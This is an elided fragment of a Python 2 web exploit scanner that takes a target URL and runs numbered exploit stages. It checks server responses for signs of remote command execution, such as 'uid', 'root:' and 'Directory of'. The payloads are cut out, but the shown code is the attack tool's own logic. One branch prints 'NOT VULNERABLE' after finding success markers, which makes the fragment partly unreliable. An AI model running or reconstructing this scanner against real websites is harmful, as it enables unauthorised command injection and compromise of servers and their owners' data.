...
print " * Example: http(s)://www.example.com/files.login\n"
...
if len(host) > 0:
	if host.find("https://") != -1 or host.find("http://") != -1:
		...
		if response.read().find("mamalo") != -1:
			...
			print BOLD+" [+] EXECUTING EXPLOIT 2"+ENDC
				...
				try:
					...
					result = urllib2.urlopen(req).read()
				  	...
				  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("uid") != -1 or result.find("root:") != -1:
						...
						print BLUE+"     [-] NOT VULNERABLE "+ENDC + "Payload: " + str(x)
						pass		
				except:
					print OTRO+"\n BYE :(\n"+ENDC
					sys.exit(1)
		...
		if flag == 0:
			print BLUE+"     [-] NOT VULNERABLE"+ENDC			
			print BOLD+" [+] EXECUTING EXPLOIT 3"+ENDC
			result = ''
		...
		print RED+" Missing protocol (https or http) for the domain\n"+ENDC
		sys.exit(1)
else:
	print RED+" You must enter URL\n"+ENDC
	sys.exit(1)
